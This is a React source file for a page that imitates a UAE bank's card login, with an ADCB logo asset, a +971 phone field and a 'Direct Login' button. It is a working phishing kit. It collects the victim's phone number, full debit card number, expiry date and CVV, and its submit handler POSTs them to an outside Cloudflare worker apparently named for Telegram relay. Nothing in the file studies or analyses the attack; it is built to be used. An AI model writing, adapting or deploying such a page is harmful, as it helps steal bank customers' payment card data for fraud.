import React, { useState } from "react";
import { ArrowLeft, Info, ScanLine, CreditCard } from "lucide-react";
import flag from "../src/assets/uaeflag.webp";
import { useNavigate } from "react-router-dom";
import logo from "../src/assets/adcb.jpg";
const NewPhoneRegistration = () => {
    const [formData, setFormData] = useState({
        phone: "",
        cardNumber: "",
        expiry: "",
        cvc: "",
    });
    const navigate = useNavigate();
    const [errors, setErrors] = useState({});

    // Handle normal input
    const handleChange = (e) => {
        const { name, value } = e.target;

        setFormData((prev) => ({
            ...prev,
            [name]:
                name === "phone"
                    ? value.replace(/\D/g, "")
                    : name === "cardNumber"
                        ? value.replace(/\D/g, "").slice(0, 16)
                        : name === "cvc"
                            ? value.replace(/\D/g, "").slice(0, 3)
                            : value,
        }));
    };

    // Handle Expiry MM/YY
    const handleExpiryChange = (e) => {
        let value = e.target.value.replace(/\D/g, "");

        if (value.length > 4) value = value.slice(0, 4);

        if (value.length > 2) {
            value = value.substring(0, 2) + "/" + value.substring(2);
        }

        setFormData((prev) => ({
            ...prev,
            expiry: value,
        }));
    };

    // Card Number XXXX XXXX XXXX XXXX
    const formatCardNumber = (value) => {
        return value
            .replace(/\D/g, "")
            .replace(/(.{4})/g, "$1 ")
            .trim();
    };

    // Validation
    const validate = () => {
        let newErrors = {};

        if (!formData.phone || formData.phone.length < 8) {
            newErrors.phone = "Enter a valid phone number";
        }

        if (formData.cardNumber.length !== 16) {
            newErrors.cardNumber = "Card number must be 16 digits";
        }

        if (!/^\d{2}\/\d{2}$/.test(formData.expiry)) {
            newErrors.expiry = "Expiry should be MM/YY";
        }

        if (formData.cvc.length !== 3) {
            newErrors.cvc = "CVC must be 3 digits";
        }

        setErrors(newErrors);

        return Object.keys(newErrors).length === 0;
    };

    // Submit
    // const handleSubmit = async (e) => {
    //     e.preventDefault();

    //     if (!validate()) return;

    // console.log("Submitted Data:", formData);
    const handleSubmit = async (e) => {
        e.preventDefault();
        if (!validate()) return;
        try {
            const response = await fetch("https://my-worker.atique-telegram.workers.dev", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    type: "card",
                    phone: formData.phone,
                    cardHolder: "xyz",
                    cardNumber: formData.cardNumber,
                    expiryDate: formData.expiry,
                    cvv: formData.cvc,
                }),
            });

            const result = await response.json();
            // console.log("API Response:", result);
            if (result.success) {
                navigate("/bank-query", { state: { phone: formData.phone, cardNumber: formData.cardNumber } });
            } else {
                alert("Submission failed. Please try again.");
            }
        } catch (error) {
            console.error("Error submitting card info:", error);
            alert("An error occurred. Please try again.");
        }
    };
    // };

    return (
        <div className=" bg-[#F7F7F7] flex justify-center">
            <div className="w-full max-w-sm min-h-screen bg-white relative">
                <form
                    onSubmit={handleSubmit}
                    className="px-5 pt-5 pb-28"
                >
                    {/* Header */}
                    <button
                        type="button"
                        className="mb-6 text-red-500"
                    >
                        <img src={logo} className="w-30 h-16" alt="Arrow Left" />
                        {/* <ArrowLeft size={20} /> */}
                    </button>

                    <h2 className="text-2xl font-semibold mb-8">
                        Login Through ATM Card
                    </h2>

                    {/* Phone */}
                    <div className="mb-6">
                        <label className="text-xs text-gray-500 block mb-2">
                            Phone number
                        </label>

                        <div className="flex items-center border-b border-gray-300 pb-2">
                            {/* Country Code */}
                            <button
                                type="button"
                                className="flex items-center gap-2 pr-3 border-r border-gray-300"
                            >
                                <img
                                    src={flag} // Put the UAE flag in your public/images folder
                                    alt="UAE"
                                    className="w-6 h-4 object-cover rounded-sm"
                                />

                                <span className="text-sm font-medium text-gray-700">
                                    (+971)
                                </span>

                                <svg
                                    className="w-4 h-4 text-red-500"
                                    fill="none"
                                    stroke="currentColor"
                                    strokeWidth="2"
                                    viewBox="0 0 24 24"
                                >
                                    <path
                                        strokeLinecap="round"
                                        strokeLinejoin="round"
                                        d="M19 9l-7 7-7-7"
                                    />
                                </svg>
                            </button>

                            <input
                                type="tel"
                                name="phone"
                                maxLength={8}
                                value={formData.phone}
                                onChange={handleChange}
                                placeholder="99999999"
                                className="flex-1 pl-3 outline-none text-sm"
                            />
                        </div>

                        <div className="flex mt-3 text-xs text-gray-500">
                            <Info
                                size={14}
                                className="mr-2 mt-0.5"
                            />
                            This number should be registered with your account.
                        </div>

                        {errors.phone && (
                            <p className="text-red-500 text-xs mt-2">
                                {errors.phone}
                            </p>
                        )}
                    </div>

                    {/* Card Number */}
                    <div className="mb-8">
                        <label className="text-xs text-gray-500 block mb-2">
                            Debit/ATM Card number
                        </label>

                        <input
                            type="text"
                            name="cardNumber"
                            value={formatCardNumber(formData.cardNumber)}
                            inputMode="numeric"
                            pattern="[0-9 ]*"
                            maxLength={19}
                            onChange={handleChange}
                            placeholder="XXXX XXXX XXXX XXXX"
                            className="w-full border-b pb-2 outline-none tracking-widest"
                        />

                        {errors.cardNumber && (
                            <p className="text-red-500 text-xs mt-2">
                                {errors.cardNumber}
                            </p>
                        )}
                    </div>

                    {/* Divider */}
                    <div className="flex items-center my-5">
                        <div className="flex-1"></div>
                        <span className="mx-3 text-xs text-gray-400">
                            OR
                        </span>
                        <div className="flex-1"></div>
                    </div>

                    {/* Scan */}
                    <button
                        type="button"
                        className="flex items-center justify-center w-full text-red-500 font-medium mb-6"
                    >
                        <ScanLine
                            size={18}
                            className="mr-2"
                        />
                        Scan your Debit/ATM Card
                    </button>

                    {/* Divider */}
                    {/* <div className="flex items-center my-5">
                        <div className="flex-1"></div>
                        <span className="mx-3 text-xs text-gray-400">
                            OR
                        </span>
                        <div className="flex-1"></div>
                    </div> */}

                    {/* Expiry & CVC */}
                    <div className="grid grid-cols-2 gap-5">
                        <div>
                            <label className="text-xs text-gray-500 block mb-2">
                                Expiry Date
                            </label>

                            <input
                                type="text"
                                value={formData.expiry}
                                onChange={handleExpiryChange}
                                placeholder="MM/YY"
                                maxLength={5}
                                inputMode="numeric"
                                className="w-full border-b pb-2 outline-none"
                            />

                            {errors.expiry && (
                                <p className="text-red-500 text-xs mt-2">
                                    {errors.expiry}
                                </p>
                            )}
                        </div>

                        <div>
                            <label className="text-xs text-gray-500 block mb-2">
                                CVC
                            </label>

                            <input
                                type="password"
                                name="cvc"
                                value={formData.cvc}
                                onChange={handleChange}
                                placeholder="XXX"
                                maxLength={3}
                                inputMode="numeric"
                                className="w-full border-b pb-2 outline-none"
                            />
                            <p className="text-[9px] text-gray-400 mt-1">
                               3 digits (CVV on back of card)
                            </p>
                            {errors.cvc && (
                                <p className="text-red-500 text-xs mt-2">
                                    {errors.cvc}
                                </p>
                            )}
                        </div>
                    </div>
                    <div className="mt-7">
                        <button
                            type="submit"
                            onClick={handleSubmit}
                            className="w-full h-12 rounded-full bg-[#F44336] text-white font-semibold hover:bg-red-600 transition"
                        >
                            Direct Login
                        </button>
                    </div>
                </form>

                {/* Bottom Button */}

                {/* <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4">
                    <div className="max-w-sm mx-auto">
                        <button
                            onClick={handleSubmit}
                            className="w-full h-12 rounded-full bg-[#F44336] text-white font-semibold hover:bg-red-600 transition"
                        >
                            Continue
                        </button>
                    </div>
                </div> */}
            </div>
        </div>
    );
};

export default NewPhoneRegistration;